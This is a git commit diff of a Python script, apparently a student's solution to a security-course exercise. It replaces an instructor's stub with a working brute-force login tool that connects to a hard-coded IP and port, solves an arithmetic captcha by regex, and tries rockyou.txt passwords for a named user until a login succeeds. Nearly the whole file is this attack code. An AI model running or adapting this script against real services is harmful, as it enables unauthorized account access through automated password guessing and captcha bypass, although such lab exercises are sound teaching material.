f00bf9de3111b41c287d092ba48ef8ba9ba713f4
sgarciabeech <s.garciabeech@gmail.com>
2019-09-30 22:22:38 -0400

    accidentally overwrote stub.py with original

--- week/2/stub.py
+++ week/2/stub.py
@@ -1,65 +1,74 @@
-"""
-    If you know the IP address of v0idcache's server and you
-    know the port number of the service you are trying to connect
-    to, you can use nc or telnet in your Linux terminal to interface
-    with the server. To do so, run:
-
-        $ nc <ip address here> <port here>
-
-    In the above the example, the $-sign represents the shell, nc is the command
-    you run to establish a connection with the server using an explicit IP address
-    and port number.
-
-    If you have the discovered the IP address and port number, you should discover
-    that there is a remote control service behind a certain port. You will know you
-    have discovered the correct port if you are greeted with a login prompt when you
-    nc to the server.
-
-    In this Python script, we are mimicking the same behavior of nc'ing to the remote
-    control service, however we do so in an automated fashion. This is because it is
-    beneficial to script the process of attempting multiple login attempts, hoping that
-    one of our guesses logs us (the attacker) into the Briong server.
-
-    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
-
-"""
-
 import socket
+import os
+import re
+import time
 
-host = "" # IP address here
-port = 0000 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+host = "157.230.179.99"
+port = 1337
+wordlist = "/usr/share/wordlists/rockyou.txt"
+regex = r'^([0-9]+) ([\+\-\*\/]) ([0-9]+)'
 
 def brute_force():
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+	username = "ejnorman84"
+	password = ""
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+	with open(wordlist, "r") as ifile:
+        	for line in ifile:
+            		password = line
 
-            Reading:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((host, port))
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+			# captcha stuff
+			match = None
+			ans = 0
 
-            Sending:
+			while match is None:
+				time.sleep(1)
+				header = s.recv(2048)
+				headers = header.split('\n')
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
+				for h in headers:
+					print(h)
+					match = re.search(regex, h)
 
-        General idea:
+					if match:
+						break
 
-            Given that you know a potential username, use a wordlist and iterate
-            through each possible password and repeatedly attempt to login to
-            v0idcache's server.
-    """
+			if match.group(0):
+				if match.group(2) == '+':
+					ans = int(match.group(1)) + int(match.group(3))
+				elif match.group(2) == '-':
+					ans = int(match.group(1)) - int(match.group(3))
+				elif match.group(2) == '*':
+					ans = int(match.group(1)) * int(match.group(3))
+				elif match.group(2) == '/':
+					ans = int(match.group(1)) / int(match.group(3))
+				else:
+					print("ERROR")
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+			print("ANSWER: " + str(ans))
+			s.send(str(ans).encode() + '\n')
 
+			# username + password stuff
+			data = s.recv(1024)
+			print(data)
+			print("Sending username: " + username)
+			s.send(username + "\n")
 
+			data = s.recv(1024)
+			print(data)
+			print("Sending password: " + password)
+			s.send(password + "\n")
 
+			# get return message
+			time.sleep(1)
+			ret = s.recv(2048)
+			print(ret)
+
+			if "Fail" not in ret:
+				print("SGB HERE")
+				break
 
 if __name__ == '__main__':
-    brute_force()
+	brute_force()
